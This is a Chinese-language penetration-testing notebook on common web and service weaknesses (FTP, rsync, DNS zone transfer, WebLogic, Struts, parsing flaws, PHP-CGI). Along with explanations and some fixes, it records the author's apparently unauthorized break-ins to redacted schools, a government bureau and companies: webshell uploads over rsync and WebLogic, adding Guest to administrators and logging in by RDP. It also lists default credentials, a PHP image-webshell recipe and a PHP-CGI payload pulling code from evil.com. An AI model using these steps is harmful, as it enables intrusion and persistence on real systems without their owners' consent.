+<h1 id="1-ftp匿名访问或弱口令"><a href="#1-ftp匿名访问或弱口令" class="headerlink" title="1 ftp匿名访问或弱口令 "></a>1 ftp匿名访问或弱口令 </h1><h2 id="1-1-ftp匿名访问"><a href="#1-1-ftp匿名访问" class="headerlink" title="1.1 ftp匿名访问 "></a>1.1 ftp匿名访问 </h2><p>Username = anonymous &amp;&amp; password = (null )</p>
+<p>（1）cmd下，ftp xx.xx.xx.xx</p>
+<p>（2）文件夹，<a href="ftp://xx.xx.xx.xx/">ftp://xx.xx.xx.xx</a></p>
+<h2 id="1-2-ftp常见弱口令"><a href="#1-2-ftp常见弱口令" class="headerlink" title="1.2 ftp常见弱口令 "></a>1.2 ftp常见弱口令 </h2><p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p>
+<p>网站域名（例如baidu.com） <code>baidu / baidu</code></p>
+<p>（2）从xx项目中（漏扫扫出），弱口令为：</p>
+<p><code>ftp / ftp</code></p>
+<p>（3）网站使用lampp套装，未修改默认ftp密码：</p>
+<p><code>nobody / lampp</code></p>
+<h2 id="1-3-边学边用"><a href="#1-3-边学边用" class="headerlink" title="1.3 边学边用 "></a>1.3 边学边用 </h2><p>xx.xx.xx.xx 匿名访问 ftp / ftp<br>均可以登录</p>
+<p> 使用8uftp登陆：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3d03e9ebaafe6524.png"></p>
+<p>在文件夹中直接输入地址登陆：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_fc4bacc7b391f84f.png"></p>
+<p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p>
+<p>xx.xx.xx.xx yy学校</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_e8776ff5ccdeee62.png"></p>
+<p>xx.xx.xx.xx zz学校</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_158b89f932faeb71.png"></p>
+<h1 id="2-rsync匿名访问"><a href="#2-rsync匿名访问" class="headerlink" title="2 rsync匿名访问 "></a>2 rsync匿名访问 </h1><p>参考： drops.wooyun.org/papers/161</p>
+<p>rsync是一个远程数据同步工具，用 “rsync<br>算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
+<p>下载文件：</p>
+<p> ./rsync -vzrtopg –progress<br><a href="mailto:&#x2d;&#x2d;&#100;&#x65;&#x6c;&#x65;&#x74;&#x65;&#117;&#115;&#101;&#114;&#x6e;&#97;&#109;&#101;&#x40;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#120;&#46;&#x78;&#120;&#120;">&#x2d;&#x2d;&#100;&#x65;&#x6c;&#x65;&#x74;&#x65;&#117;&#115;&#101;&#114;&#x6e;&#97;&#109;&#101;&#x40;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#120;&#46;&#x78;&#120;&#120;</a>::out<br>/home/test/getfile</p>
+<p>上传文件： </p>
+<p>/user/bin/rsync -vzrtopg –progress<br>/home/test/getfile</p>
+<h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a>2.1 利用方法</h2><p>rsync<br>默认端口是873，可使用nmap进行扫描：</p>
+<p>nmap –n –open –p 873 x.x.x.x/24</p>
+<p>尝试上传、下载文件( kali<br>中)：</p>
+<p>rsync 10.210.208.39:: </p>
+<p>或 rsync –vvvv<br>rsync://10.210.208.39::</p>
+<h2 id="2-2-安全配置"><a href="#2-2-安全配置" class="headerlink" title="2.2 安全配置"></a>2.2 安全配置</h2><ul>
+<li><p>限定访问IP：IP<br>Tables防火墙或修改配置文件rsync.conf</p>
+</li>
+<li><p>不允许匿名访问，添加用户口令</p>
+</li>
+</ul>
+<h2 id="2-3-活学活用"><a href="#2-3-活学活用" class="headerlink" title="2.3 活学活用 "></a>2.3 活学活用 </h2><ul>
+<li>xx.xx.xx.xx 连接失败</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_86a6c0dd0ec67cd3.png"></p>
+<ul>
+<li>通信成功，却不知道该如何操作</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d6ea7f3e9ce65313.png"></p>
+<ul>
+<li>可以查看到目录，但是进一步访问需要密码</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_93d8b6936279365a.png"></p>
+<p>可以查看到目录，但是禁止进一步访问</p>
+<p>xx窝</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d416cd4216771f91.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.xxx.gov.cn/">http://www.xxx.gov.cn</a> xx局</li>
+</ul>
+<p><code>rsync -v xx.xx.xx.xx::</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_29db8cfd2f6f9255.png"></p>
+<p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx<br>xx.xx.xx.xx::Etest</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7ba40be2f34f1334.png"></p>
+<p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ac23219ff525104.png"></p>
+<p>获取wenshell: <a target="_blank" rel="noopener" href="http://www.xx.cn/youxiu.aspx">http://www.xx.cn/youxiu.aspx</a> admin</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_c97ac1aa5603d31e.png"></p>
+<p>xx.xx.xx.xx yy公司OA系统</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_afd89947e3e3b0f4.png"></p>
+<h1 id="3-DNS域传送漏洞"><a href="#3-DNS域传送漏洞" class="headerlink" title="3 DNS域传送漏洞 "></a>3 DNS域传送漏洞 </h1><p>参考： drops.wooyun.org/papers/64</p>
+<p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
+<h2 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1 漏洞成因 "></a>3.1 漏洞成因 </h2><p>默认安装BIND<br>，配置项中没有allow-transfer项，就会出现dns域传送<br>漏洞</p>
+<p>域传送关键配置项:</p>
+<p>allow-transfer{ipaddress;};<br>通过ip限制可进行域传送的服务器</p>
+<p>allow-transfer{key transfer;};<br>通过key限制可以进行域传送的服务器</p>
+<p>设置方式有两种：</p>
+<ul>
+<li><p>在option配置域</p>
+</li>
+<li><p>在zone配置域</p>
+</li>
+</ul>
+<p>优先级为： zone &gt; option</p>
+<h2 id="3-2-攻击方式"><a href="#3-2-攻击方式" class="headerlink" title="3.2 攻击方式 "></a>3.2 攻击方式 </h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p>
+<ul>
+<li>dos下进行测试</li>
+</ul>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ljn&gt;nslookup</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">set type=ns</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript"><span class="number">12306.</span>cn</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">server dns1.zdnscloud.biz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">ls <span class="number">12306.</span>cn</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>kali中进行测试</li>
+</ul>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\# <span class="keyword">dig</span> @<span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">12306</span>.<span class="keyword">cn</span> axfr</span><br><span class="line">(<span class="number">1.1</span>.<span class="number">1.1</span>为dns服务器IP，<span class="number">12306</span>.<span class="keyword">cn</span>为测试域名)</span><br><span class="line"></span><br><span class="line">或 \# dnsenum <span class="number">12306</span>.<span class="keyword">cn</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-3-修复方案"><a href="#3-3-修复方案" class="headerlink" title="3.3 修复方案 "></a>3.3 修复方案 </h2><p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p>
+<ul>
+<li>限制IP</li>
+<li>使用key认证。</li>
+</ul>
+<h1 id="4-weblogic弱口令"><a href="#4-weblogic弱口令" class="headerlink" title="4 weblogic弱口令 "></a>4 weblogic弱口令 </h1><p>参考： drops.wooyun.org/tips/402</p>
+<h2 id="4-1-基本信息"><a href="#4-1-基本信息" class="headerlink" title="4.1 基本信息 "></a>4.1 基本信息 </h2><p>Weblogic是美国bea公司出品的一个application<br>server（基于javaee架构的中间件），BEA<br>Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p>
+<p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p>
+<p>默认weblogic管理员账号密码： <code>weblogic / weblogic</code></p>
+<p>默认weblogic开放端口： 7001</p>
+<p>默认weblogic访问路径：<br><code>http://xxxx:7001/console</code></p>
+<p>从Default Passwords |<br>CIRT.net获取常见weblogic默认密码：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Oracle-WebLogic：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="number">11</span>g：weblogic / welcome1 (实践)</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic：<span class="keyword">system</span> / <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-Weblogic(<span class="keyword">Version</span>: <span class="number">9.0</span> Beta(Diablo))：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：<span class="keyword">admin</span> / <span class="keyword">security</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：mary / <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：joe / <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：wlcsystem / wlcsystem</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：wlpisystem / wlpisystem</span><br></pre></td></tr></table></figure>
+
+<p>查看wooyun漏洞案例，积累常见弱口令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">weblogic</span> / weblogic<span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">weblogic</span> / <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">admin</span> / <span class="number">12345678</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="4-2-利用方式"><a href="#4-2-利用方式" class="headerlink" title="4.2 利用方式 "></a>4.2 利用方式 </h2><p>寻找weblogic服务器方法：</p>
+<ul>
+<li><p>使用 IIS PUT Scaner<br>扫描80、8080端口，查看HTTP<br>banner信息，确定为weblogic；</p>
+</li>
+<li><p>直接扫描7001端口或者baidu<br>inurl: :7001/console (待尝试)</p>
+</li>
+</ul>
+<p>利用弱口令进入管理后台，在控制台部署一个web应用：</p>
+<p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application<br>Module… =&gt;upload your file(s) =&gt; Deploy</p>
+<p>在Web应用中包含模块：必须要有一个servlet或JSP<br>web.xml文件，包含web应用程序的信息</p>
+<h2 id="4-3-安全配置"><a href="#4-3-安全配置" class="headerlink" title="4.3 安全配置 "></a>4.3 安全配置 </h2><p><a target="_blank" rel="noopener" href="http://download.oracle.com/docs/cd/E12890/_01/ales/docs32/integrateappenviron/configWLS.html/#wp1099454">http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454</a></p>
+<h2 id="4-4-现学现卖"><a href="#4-4-现学现卖" class="headerlink" title="4.4 现学现卖 "></a>4.4 现学现卖 </h2><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp">http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_a09bb089c1c3b312.png"></p>
+<p>weblogic / 12345678</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6d6c9016367bb35b.png"></p>
+<p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p>
+<p>先制作war包（需安装java环境）：</p>
+<p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p>
+<p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3493c9640cf370ac.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ba1e3acff7df0d95.png"></p>
+<p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p>
+<p>（自己制作war包失败，重新下载了一个war包，上传）</p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/index/a.jsp">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E:%5C%5Cphpstudy%5C%5CWWW">http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_cf68ba09dbca62df.png"></p>
+<p>翻目录：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_63592e979d64fae2.png"></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/weimall">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_b9a7ba7d2ab3078c.png"></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/fenxiao/">http://xx.xx.xx.xx/fenxiao/</a> 米某网 </p>
+<p><a target="_blank" rel="noopener" href="http://xx.x.xx.xx/fenxiao/api/client/uc.php">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu<br>（已修改时间，该shell好用）</p>
+<p><code>net user</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d3ed608fe971124a.png"></p>
+<p><code>net user Guest xiuyou!</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6ea978c38fc505e6.png"></p>
+<p><code>net localgroup administrators</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_eae0acb1c41ca212.png"></p>
+<p><code>net localgroup administrators Guest /add</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_60b78b69da695ec6.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_30d1210394b8be38.png"></p>
+<p>mstsc打开远程终端，<code>Guest / xiuyou!</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f8671774fb643b0f.png"></p>
+<p>激活Guest用户 <code>net user Guest /active:yes</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_880a526fcaa8650a.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_25d3715c70e27e3d.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_790c103cd138a9e2.png"></p>
+<h1 id="5-struts漏洞"><a href="#5-struts漏洞" class="headerlink" title="5 struts漏洞 "></a>5 struts漏洞 </h1><p>drops.wooyun.org/papers/902</p>
+<p>sebug.net/appdir/Apache+Struts</p>
+<p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p>
+<h2 id="5-1-S2-016命令执行漏洞"><a href="#5-1-S2-016命令执行漏洞" class="headerlink" title="5.1 S2-016命令执行漏洞 "></a>5.1 S2-016命令执行漏洞 </h2><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts<br>2.3.15.1以下版本均存在此漏洞。</p>
+<h2 id="5-2-S2-017重定向漏洞"><a href="#5-2-S2-017重定向漏洞" class="headerlink" title="5.2 S2-017重定向漏洞 "></a>5.2 S2-017重定向漏洞 </h2><p>Apache Struts<br>2.0.0没有有效过滤”redirect:”/“redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p>
+<h2 id="5-3-S2-019命令执行漏洞"><a href="#5-3-S2-019命令执行漏洞" class="headerlink" title="5.3 S2-019命令执行漏洞"></a>5.3 S2-019命令执行漏洞</h2><p>Struts2 是第二代基于Model-View-Controller<br>(MVC)模型的java企业级web应用框架。Apache<br>Struts 2.3.15.2之前版本的“Dynamic Method<br>Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
+<h1 id="6-web服务器解析漏洞"><a href="#6-web服务器解析漏洞" class="headerlink" title="6 web服务器解析漏洞 "></a>6 web服务器解析漏洞 </h1><p><a target="_blank" rel="noopener" href="http://www.cnseay.com/806/">www.cnseay.com/806/</a></p>
+<h2 id="6-1-IIS-6-0"><a href="#6-1-IIS-6-0" class="headerlink" title="6.1 IIS 6.0 "></a>6.1 IIS 6.0 </h2><ul>
+<li><p>后缀解析： /xx.asp;.jpg</p>
+</li>
+<li><p>目录解析： /xx.asp/xx.jpg<br>（xx.asp目录下可解析任何文件）</p>
+</li>
+<li><p>默认解析： xx.asa xx.cer xx.cdx<br>（IIS默认配置中，该类文件由asp.dll解析）</p>
+</li>
+<li><p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p>
+</li>
+</ul>
+<h2 id="6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 "></a>6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 </h2><p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p>
+<p>xx.jpg为一句话图片马，制作过程如下：</p>
+<p><code>copy yy.jpg/b + zz.txt/a xx.jpg</code></p>
+<p>/b：二进制模式</p>
+<p>/a：ASCII模式</p>
+<p>yy.jpg ：正常图片文件</p>
+<p>zz.txt ：一句话 &lt;?PHP<br>fputs(fopen(‘shell.php’,’w’),’&lt;?PHP<br>eval($_POST\youxiu)?&gt;’);?&gt;</p>
+<p>shell.php youxiu</p>
+<h2 id="6-3-Nginx-lt-0-8-37"><a href="#6-3-Nginx-lt-0-8-37" class="headerlink" title="6.3 Nginx&lt;=0.8.37 "></a>6.3 Nginx&lt;=0.8.37 </h2><p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p>
+<p>在文件路劲(xx.jpg)后面加上%00.php ，即<br>xx.jpg%00.php<br>会被当做php文件来解析</p>
+<p>参照《Nginx空字节可远程执行代码漏洞》</p>
+<h2 id="6-4-Apache"><a href="#6-4-Apache" class="headerlink" title="6.4 Apache "></a>6.4 Apache </h2><ul>
+<li>后缀解析： test.php.x1.x2.x3<br>（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li>
+</ul>
+<p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p>
+<p>Apache可解析： php | php3 | phtml</p>
+<p>参照《Apache漏洞之后缀名解析漏洞》</p>
+<p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p>
+<p>&lt;Files ~ ”.(php.|php3.|phtml.)”&gt;</p>
+<p>Order Allow,Deny</p>
+<p>Deny from all</p>
+<p>&lt;/Files&gt;</p>
+<ul>
+<li>若在Apache中，<br>.htaccess可被应用（即<br>AllowOverride=All）</li>
+</ul>
+<p>.htaccess可被上传</p>
+<p>则在.htaccess中写入<br>(shell.jpg为上传文件，便可得到shell)</p>
+<p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;</p>
+<h2 id="6-5-lighttpd"><a href="#6-5-lighttpd" class="headerlink" title="6.5 lighttpd "></a>6.5 lighttpd </h2><p>xx.jpg/xx.php</p>
+<h2 id="6-6-windows环境"><a href="#6-6-windows环境" class="headerlink" title="6.6 windows环境 "></a>6.6 windows环境 </h2><p>Windows环境下，文件 xx.jpg[空格]</p>
+<p>文件 xx.jpg.</p>
+<p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p>
+<h1 id="7-PHP-CGI远程任意代码执行漏洞"><a href="#7-PHP-CGI远程任意代码执行漏洞" class="headerlink" title="7 PHP-CGI远程任意代码执行漏洞 "></a>7 PHP-CGI远程任意代码执行漏洞 </h1><p>zone.wooyun.org/content/151</p>
+<p><a target="_blank" rel="noopener" href="http://www.hackbase.com/tech/2012-05-07/66395.html">www.hackbase.com/tech/2012-05-07/66395.html</a></p>
+<p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7505e63d7f39ad25.png"></p>
+<h2 id="7-1-本地包含执行代码"><a href="#7-1-本地包含执行代码" class="headerlink" title="7.1 本地包含执行代码 "></a>7.1 本地包含执行代码 </h2><p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p>
+<p><a target="_blank" rel="noopener" href="http://target.com/test.php?-dauto%5C_prepend%5C_file=/proc/self/environ+-n">http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n</a> </p>
+<p>（/proc/self/environ 为本地文件路径）</p>
+<h2 id="7-2-远程包含执行代码"><a href="#7-2-远程包含执行代码" class="headerlink" title="7.2 远程包含执行代码 "></a>7.2 远程包含执行代码 </h2><p>Curl<br><a target="_blank" rel="noopener" href="http://target.com/test.php?-dallow%5C_url%5C_include=On+-dauto%5C_prepend%5C_file=http://www.evil.com/evil.txt">http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a> </p>
+<p>（%3d = %3a : %2f / ）</p>
+<p>（<a target="_blank" rel="noopener" href="http://www.evail.com/evil.txt%E4%B8%BA%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%89">http://www.evail.com/evil.txt为木马文件）</a></p>
+<h1 id="8-FCK编辑器上传漏洞"><a href="#8-FCK编辑器上传漏洞" class="headerlink" title="8 FCK编辑器上传漏洞 "></a>8 FCK编辑器上传漏洞 </h1><h2 id="8-1-漏洞利用"><a href="#8-1-漏洞利用" class="headerlink" title="8.1 漏洞利用 "></a>8.1 漏洞利用 </h2><ul>
+<li><p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p>
+</li>
+<li><p>编辑器 + web服务器解析漏洞</p>
+</li>
+<li><p>突破后台建立文件夹漏洞（. 变<br>_）</p>
+</li>
+</ul>
+<h1 id="9-Apache-Server-Status对外暴露"><a href="#9-Apache-Server-Status对外暴露" class="headerlink" title="9 Apache Server Status对外暴露 "></a>9 Apache Server Status对外暴露 </h1><p><a target="_blank" rel="noopener" href="http://www.ccvita.com/333.html">www.ccvita.com/333.html</a></p>
+<p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块<br>server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p>
+<h2 id="9-1-利用方式"><a href="#9-1-利用方式" class="headerlink" title="9.1 利用方式 "></a>9.1 利用方式 </h2><p>未做限制访问的URL为：<a target="_blank" rel="noopener" href="http://www.apache.org/server-status">http://www.apache.org/server-status</a></p>
+<h1 id="10-网站备份文件可下载"><a href="#10-网站备份文件可下载" class="headerlink" title="10 网站备份文件可下载 "></a>10 网站备份文件可下载 </h1><p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p>
+<h2 id="10-1-利用方式"><a href="#10-1-利用方式" class="headerlink" title="10.1 利用方式 "></a>10.1 利用方式 </h2><p>常见备份目录为：</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.rar">http://www.xxx.com/xxx.rar</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.zip">http://www.xxx.com/xxx.zip</a></p>
+<p><a target="_blank" rel="noopener" href="http://aaa.xxx.com/aaa.rar">http://aaa.xxx.com/aaa.rar</a></p>
+<p><a target="_blank" rel="noopener" href="http://bbb.xxx.com.cn/bbb.tar">http://bbb.xxx.com.cn/bbb.tar</a></p>
+<p><a target="_blank" rel="noopener" href="http://bbb.xxx.com/sysadmin.tar.gz">http://bbb.xxx.com/sysadmin.tar.gz</a></p>
+<p>ip/<a target="_blank" rel="noopener" href="http://www.xxx.com.zip/">www.xxx.com.zip</a></p>
+<ul>
+<li><p>直接在URL中访问，然后下载</p>
+</li>
+<li><p>使用curl工具 例如： curl -I<br><a target="_blank" rel="noopener" href="http://www.fff.com/fff.zip">http://www.fff.com/fff.zip</a></p>
+</li>
+</ul>
+<p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p>
+<h1 id="11-目录遍历并查看敏感数据"><a href="#11-目录遍历并查看敏感数据" class="headerlink" title="11 目录遍历并查看敏感数据 "></a>11 目录遍历并查看敏感数据 </h1><p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p>
+<h2 id="11-1-利用方式"><a href="#11-1-利用方式" class="headerlink" title="11.1 利用方式 "></a>11.1 利用方式 </h2><p>根据从wooyun上看到的漏洞，其发现方式主要有:</p>
+<ul>
+<li><p>wvs扫描目录 (inc，<br>返回312，直接访问看到目录列表)</p>
+</li>
+<li><p>常见泄露路径：</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/caches">http://www.xxx.com/caches</a></p>
